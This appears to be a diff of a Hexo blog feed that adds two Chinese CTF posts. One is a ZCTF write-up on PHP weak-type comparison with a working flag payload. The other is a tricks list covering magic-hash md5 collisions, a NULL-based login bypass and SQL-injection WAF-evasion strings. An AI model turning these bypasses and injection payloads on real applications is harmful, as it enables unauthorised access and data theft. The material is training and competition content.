@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-03-30T08:16:38.483Z</updated>
+  <updated>2017-04-05T15:32:51.324Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,104 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ZCTF线下赛php弱类型</title>
+    <link href="http://yoursite.com/2017/04/05/ZCTF%E7%BA%BF%E4%B8%8B%E8%B5%9Bphp%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
+    <id>http://yoursite.com/2017/04/05/ZCTF线下赛php弱类型/</id>
+    <published>2017-04-05T15:09:35.000Z</published>
+    <updated>2017-04-05T15:32:51.324Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01源码获取"><a href="#0x01源码获取" class="headerlink" title="0x01源码获取"></a>0x01源码获取</h3><p>源码泄露，通过源码泄露工具获得一个php文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line">$l01o=<span class="number">0</span>;</div><div class="line">$o1l0=<span class="number">0</span>;</div><div class="line">$o10l=<span class="number">0</span>;</div><div class="line">$lo10=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'vhghf'</span>])) <span class="comment">//GET传入一个vhghf</span></div><div class="line">&#123;</div><div class="line">        $vhghf = $_GET[<span class="string">'vhghf'</span>];</div><div class="line">        $vhghf==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果vhghf等于1则退出</span></div><div class="line">        <span class="keyword">switch</span> ($vhghf)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//如果vhghf等于1则$101o等于1</span></div><div class="line">                $l01o=<span class="number">1</span>;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"1"</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$dfgdf=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'dfgdf'</span>]); <span class="comment">//GET传入dfgdf且进行json_decode且创建一个数组</span></div><div class="line"><span class="keyword">if</span>(is_array($dfgdf))&#123;  <span class="comment">//如果为数组则进行接下来的</span></div><div class="line">    is_numeric(@$dfgdf[<span class="string">"gvnghdjk"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//判断dfgdf中的gvnghdjk是否为数字或数字字符串</span></div><div class="line">    <span class="keyword">if</span>(@$dfgdf[<span class="string">"gvnghdjk"</span>])&#123;</div><div class="line">        ($dfgdf[<span class="string">"gvnghdjk"</span>]&gt;<span class="number">2017</span>)?$o1l0=<span class="number">1</span>:<span class="keyword">NULL</span>; <span class="comment">//gvnghdjk大于2017</span></div><div class="line">         </div><div class="line">    &#125;</div><div class="line">    var_dump($dfgdf[<span class="string">"uxcndffznb"</span>]);</div><div class="line">    <span class="keyword">if</span>(is_array(@$dfgdf[<span class="string">"uxcndffznb"</span>]))&#123; <span class="comment">//uxcndffznb要为数组</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"2"</span>;</div><div class="line">        <span class="keyword">if</span>(count($dfgdf[<span class="string">"uxcndffznb"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($dfgdf[<span class="string">"uxcndffznb"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); <span class="comment">//数组中有两个值，且第一个还要为数组</span></div><div class="line">        $kghdhfghdfgbcvhgffg = array_search(<span class="string">"ZCTF"</span>, $dfgdf[<span class="string">"uxcndffznb"</span>]); <span class="comment">//查询uxcndffznb中有没有ZCTF有则返回1没则返回false</span></div><div class="line">        var_dump($kghdhfghdfgbcvhgffg);</div><div class="line">        $kghdhfghdfgbcvhgffg===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; <span class="comment">//如果为false则退出</span></div><div class="line">        <span class="keyword">foreach</span>($dfgdf[<span class="string">"uxcndffznb"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; <span class="comment">//查询uxcndffznb中是否有ZCTF如果有则退出</span></div><div class="line">            var_dump($val);</div><div class="line">			</div><div class="line">            $val===<span class="string">"ZCTF"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</div><div class="line">			<span class="keyword">echo</span> $val;</div><div class="line">        &#125;</div><div class="line">        $o10l=<span class="number">1</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"3"</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$cdggjydcnfsdyjaq = $_GET[<span class="string">'cdggjydcnfsdyjaq'</span>]; <span class="comment">//MD5碰撞</span></div><div class="line"><span class="keyword">if</span> ($cdggjydcnfsdyjaq != <span class="string">'15562'</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (strstr($cdggjydcnfsdyjaq, <span class="string">'2017ZCTF'</span>)) &#123;</div><div class="line">        <span class="keyword">if</span> (substr(md5($cdggjydcnfsdyjaq),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"4"</span>.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">            $lo10=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>getflag前提：<figure class="highlight plain"><figcaption><span>&& $o1l0 && $o10l && $lo10)都符合要求了就出flag，而具体看就是要求这四个值都为1```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;!--more--&gt;</div><div class="line"></div><div class="line">### 0x02分析</div><div class="line">#### l01o</div></pre></td></tr></table></figure></p>
+<p>将vhghf与1进行比较，而且是双等号，直接1+任意字母绕过<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#### o1l0+o10l</div></pre></td></tr></table></figure></p>
+<p>dfgdf[“gvnghdjk”]&gt;2017与第一个相似，用大于2017的数值加任意字母绕过</p>
+<p>array_search是弱类型的比较<br>var_dump(in_array(“abc”, $array1));<br><br>var_dump(in_array(“1bc”, $array2));<br>它遍历了array的每个值，并且作”==”比较（“当设置了strict 用===”）<br>结果很明显了<br>如果array1里面有个值为0，那么第一条返回就会为真//intval(‘abc’)=0<br>如果array2里面有个值为1，那么第二条就会为真//intval(‘1bc’)=1<br>数字0双等于所有的无数字开头的字符串，可以用0去绕过array_search的比较<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#### lo10</div></pre></td></tr></table></figure></p>
+<p>$cdggjydcnfsdyjaq != ‘15562’</p>
+<p>(substr(md5($cdggjydcnfsdyjaq),8,16) == substr(md5(‘15562’),8,16))<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">线上赛已经出现过</div><div class="line">### <span class="number">0x03</span> 测试</div></pre></td></tr></table></figure></p>
+<p>payload=<br>?vhghf=1a$&amp;&amp;dfgdf={“gvnghdjk”:”2018aaa”,”uxcndffznb”:[[“ZCTF”],0]}&amp;&amp;cdggjydcnfsdyjaq=x2017ZCTF24834<br>```<br><img src="http://i1.piimg.com/567571/7fe8c9df09135bd0.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01源码获取&quot;&gt;&lt;a href=&quot;#0x01源码获取&quot; class=&quot;headerlink&quot; title=&quot;0x01源码获取&quot;&gt;&lt;/a&gt;0x01源码获取&lt;/h3&gt;&lt;p&gt;源码泄露，通过源码泄露工具获得一个php文件&lt;br&gt;&lt;figure class=&quot;highl
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF Tricks</title>
+    <link href="http://yoursite.com/2017/04/05/CTF-Tricks/"/>
+    <id>http://yoursite.com/2017/04/05/CTF-Tricks/</id>
+    <published>2017-04-05T05:03:32.000Z</published>
+    <updated>2017-04-05T15:32:11.557Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-php弱类型"><a href="#0x01-php弱类型" class="headerlink" title="0x01 php弱类型"></a>0x01 php弱类型</h3><h4 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h4><p>php变量类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">string</div><div class="line">integer</div><div class="line"><span class="keyword">array</span></div><div class="line">double</div><div class="line">object</div><div class="line">resource</div><div class="line"><span class="keyword">NULL</span></div><div class="line"></div><div class="line">string <span class="keyword">array</span> <span class="keyword">NULL</span>  可以从RGPC传入</div><div class="line">遇到不符类型，自动转换</div></pre></td></tr></table></figure></p>
+<p>php类型装换<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="string">''</span> == <span class="number">0</span> == <span class="keyword">false</span></div><div class="line"><span class="string">'123'</span> == <span class="number">123</span></div><div class="line"><span class="string">'abc'</span> == <span class="number">0</span></div><div class="line"><span class="string">'123a'</span> == <span class="number">123</span></div><div class="line"><span class="string">'0x01'</span> == <span class="number">1</span></div><div class="line"><span class="string">'0e123456789'</span> == <span class="string">'0e987654321'</span></div><div class="line">[<span class="keyword">false</span>] == [<span class="number">0</span>] == [<span class="keyword">NULL</span>] == [<span class="string">''</span>]</div><div class="line"><span class="keyword">NULL</span> == <span class="keyword">false</span> == <span class="number">0</span></div><div class="line"><span class="keyword">true</span> == <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h4 id="题型1-scrcmp"><a href="#题型1-scrcmp" class="headerlink" title="题型1 scrcmp"></a>题型1 scrcmp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'flag'</span>],FLAG) == <span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div><div class="line"></div><div class="line">scrcmp:如果 str1 小于 str2 返回 &lt; <span class="number">0</span>； 如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；如果两者相等，返回 <span class="number">0</span></div><div class="line">strcmp比较出错=&gt;返回<span class="keyword">NULL</span>=&gt;<span class="keyword">NULL</span> == <span class="number">0</span> =&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://i4.buimg.com/567571/ad87307d19e8920c.png" alt=""></p>
+<h4 id="题型2-字符串比较（原值不相等，md5值相等）"><a href="#题型2-字符串比较（原值不相等，md5值相等）" class="headerlink" title="题型2 字符串比较（原值不相等，md5值相等）"></a>题型2 字符串比较（原值不相等，md5值相等）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">define(<span class="string">'FLAG'</span>,<span class="string">'CTF&#123;THIS_IS_FLAG&#125;'</span>);</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'s1'</span>] != $_GET[<span class="string">'s2'</span>]</div><div class="line">	&amp;&amp; md5($_GET[<span class="string">'s1'</span>]) == md5($_GET[<span class="string">'s2'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"success,flag:"</span>.FLAG;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://i2.muimg.com/567571/1b97150d0fd6d935.png" alt=""></p>
+<h5 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h5><blockquote>
+<p>什么是科学计数法</p>
+</blockquote>
+<p>‘0e123456789’ == ‘0e987654321’ == 0</p>
+<blockquote>
+<p>md5值的取值范围</p>
+</blockquote>
+<p>‘0123456789abcdef’</p>
+<blockquote>
+<p>[0e+数字]的md5</p>
+</blockquote>
+<p>md5(‘QNKCDZO’) ==<br>‘0e830400451993494058024219903391’</p>
+<p>md5(‘240610708’) ==<br>‘0e462097431906509019562988736854’</p>
+<h5 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h5><blockquote>
+<p>PHP md5函数特性</p>
+</blockquote>
+<p>md5([1,2,3]) == md5([4,5,6]) == NULL</p>
+<blockquote>
+<p>数组Trick,无需再利用弱类型比较特性<br><img src="http://i1.piimg.com/567571/cb2f754cdbe6b79a.png" alt=""><br>总结的一些常用的比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">php &gt; var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>),   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                    </div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e462097431906509019562988736854"</span></div><div class="line">  string(<span class="number">32</span>) <span class="string">"0e830400451993494058024219903391"</span></div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> == <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(<span class="string">"0e462097431906509019562988736854"</span> === <span class="string">"0e830400451993494058024219903391"</span>);</div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ===   md5(<span class="string">'QNKCDZO'</span>));                                                                                                                                                 </div><div class="line">  bool(<span class="keyword">false</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) ==   md5(<span class="string">'QNKCDZO'</span>));                                                                                       </div><div class="line">  bool(<span class="keyword">true</span>)</div><div class="line">  php &gt; var_dump(md5(<span class="string">'240610708'</span>) === md5(<span class="string">'QNKCDZO'</span>));</div><div class="line">  bool(<span class="keyword">false</span>)</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="题型3-登录逻辑常见考点"><a href="#题型3-登录逻辑常见考点" class="headerlink" title="题型3 登录逻辑常见考点"></a>题型3 登录逻辑常见考点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$name = addcslashes($_POST[<span class="string">'name'</span>]);</div><div class="line">$r = $db-&gt;get_row(<span class="string">"SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'"</span>);</div><div class="line"><span class="keyword">if</span>($r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>]))&#123;</div><div class="line">	<span class="comment">//...login success</span></div><div class="line">&#125;</div><div class="line">不存在sql注入漏洞</div><div class="line">密码比较使用严格模式“===”，故此处不存在弱类型比较漏洞</div></pre></td></tr></table></figure>
+<p>运行流程:</p>
+<p><img src="http://i2.muimg.com/567571/4b6433b7282b4e81.png" alt=""></p>
+<blockquote>
+<p>NULL的巧妙构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户不存在=&gt;$r[<span class="string">'pass'</span>]&lt;=&gt;<span class="keyword">NULL</span></div><div class="line">密码是数组=&gt;md5($_POST[<span class="string">'pass'</span>]) ⇔ <span class="keyword">NULL</span></div><div class="line">$r[<span class="string">'pass'</span>] === md5($_POST[<span class="string">'pass'</span>])</div><div class="line"><span class="keyword">NULL</span> === <span class="keyword">NULL</span> 成立</div><div class="line">成功登录！</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="0x02-发现源码（题面信息越少，越可能需要找到源码）"><a href="#0x02-发现源码（题面信息越少，越可能需要找到源码）" class="headerlink" title="0x02 发现源码（题面信息越少，越可能需要找到源码）"></a>0x02 发现源码（题面信息越少，越可能需要找到源码）</h3><blockquote>
+<p>发现套路<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">题目只给出一个登录框</div><div class="line">页面只有一两行字</div><div class="line">页面中包含Powered XXX</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p>关于misc查看通讯地址Trick</p>
+<p>直接丢到 <a href="https://www.virustotal.com/" target="_blank" rel="external">https://www.virustotal.com/</a> 在 Behavioural information 可以看到通讯地址</p>
+<p>源码发掘考点一览<br><img src="http://i2.muimg.com/567571/8ad57cf3994ffdea.png" alt=""></p>
+<h3 id="0x03-CTF比赛中的那些WAF与绕过"><a href="#0x03-CTF比赛中的那些WAF与绕过" class="headerlink" title="0x03 CTF比赛中的那些WAF与绕过"></a>0x03 CTF比赛中的那些WAF与绕过</h3><h4 id="题型4-字符串替换WAF"><a href="#题型4-字符串替换WAF" class="headerlink" title="题型4 字符串替换WAF"></a>题型4 字符串替换WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"union"</span>, <span class="string">""</span>, $str);</div><div class="line">$str = str_replace(<span class="string">"into"</span>, <span class="string">""</span>, $str);</div></pre></td></tr></table></figure>
+<p>一大堆非常严格的过滤，最后出现一处字符串替换空型WAF</p>
+<p>方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> uniunionon selselectect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> from `admin` limit <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<h4 id="题型5-字符替换空型WAF加强版"><a href="#题型5-字符替换空型WAF加强版" class="headerlink" title="题型5 字符替换空型WAF加强版"></a>题型5 字符替换空型WAF加强版</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$tmp_str = <span class="string">""</span>;</div><div class="line"><span class="keyword">while</span>($tmp_str != $str) &#123;</div><div class="line"> $tmp_str = $str;</div><div class="line"> $str = str_replace(<span class="string">"select"</span>, <span class="string">""</span>, $str);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>通过循环替换转移注意力，实际简单的大小写变换即可绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php?str=<span class="number">-1</span> UniON SeLeCT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> FrOM `admin` LiMiT <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<h4 id="题型6-特殊字符-串-拦截型WAF"><a href="#题型6-特殊字符-串-拦截型WAF" class="headerlink" title="题型6 特殊字符(串)拦截型WAF"></a>题型6 特殊字符(串)拦截型WAF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(\bselect\b|\bunion\b|and|or|;|,|#|\(|\))/is'</span>,</div><div class="line">$_GET[<span class="string">'id'</span>])) &#123;</div><div class="line"> <span class="keyword">exit</span>(<span class="string">'BAD ID'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>####那些常见的SQL Trick<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[\bselect\b] 或 [\bunion\b]: </div><div class="line">    Mysql条件注释的利用 <span class="comment">/*!50000select*/</span></div><div class="line">    浮点数利用WHERE id=0.1UnIoN <span class="keyword">SeLeCT</span> ...</div><div class="line">[#]</div><div class="line">    Mysql注释符:<span class="comment">/**/</span>,<span class="comment">/*!条件注释*、,--,;,`</span></div><div class="line">[,]</div><div class="line">    盲注 mid(user() from 1 for 1) == mid(user(),1,1)</div><div class="line">    UNION注入 union select * from (select 1)a join (select 2)b ==union select 1,2</div><div class="line">[and] 或 [or]: </div><div class="line">    查缺补漏xor,||,&amp;&amp;.!,not</div><div class="line">[&gt;|=|&lt;] 逻辑操作符:</div><div class="line">    关键字替代符号 between、like、rlike、regex、is</div><div class="line">    与0比较法 -1 or 1=1 and ord(substr(user(),1,1))-114</div><div class="line">[空白符]</div><div class="line">    控制字符替代法20 09 0A 0B 0C 0D A0</div><div class="line">    符号替代法 /**/、select.<span class="string">``</span>.password、<span class="keyword">select</span>+<span class="keyword">user</span>()</div><div class="line">    括号组合法 <span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),<span class="number">2</span>)、<span class="keyword">select</span>&#123;x(<span class="keyword">password</span>)&#125;<span class="keyword">from</span>&#123;x(<span class="keyword">user</span>)&#125;</div></pre></td></tr></table></figure></p>
+<p><a href="https://regex101.com/" target="_blank" rel="external">不要害怕正则</a></p>
+<p>未完待续！！！！！！！！</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/SHARE/some-ctf-tricks-ppt.html" target="_blank" rel="external">CTF比赛总是输？你还差点Tricks!</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-php弱类型&quot;&gt;&lt;a href=&quot;#0x01-php弱类型&quot; class=&quot;headerlink&quot; title=&quot;0x01 php弱类型&quot;&gt;&lt;/a&gt;0x01 php弱类型&lt;/h3&gt;&lt;h4 id=&quot;什么是php弱类型&quot;&gt;&lt;a href=&quot;#什么是php弱类型&quot; class=&quot;headerlink&quot; title=&quot;什么是php弱类型&quot;&gt;&lt;/a&gt;什么是php弱类型&lt;/h4&gt;&lt;p&gt;php变量类型&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;string&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;integer&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;double&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;object&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;resource&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;string &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;  可以从RGPC传入&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;遇到不符类型，自动转换&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;php类型装换&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; == &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;123&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;abc&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;123a&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;0x01&#39;&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;0e123456789&#39;&lt;/span&gt; == &lt;span class=&quot;string&quot;&gt;&#39;0e987654321&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;] == [&lt;span 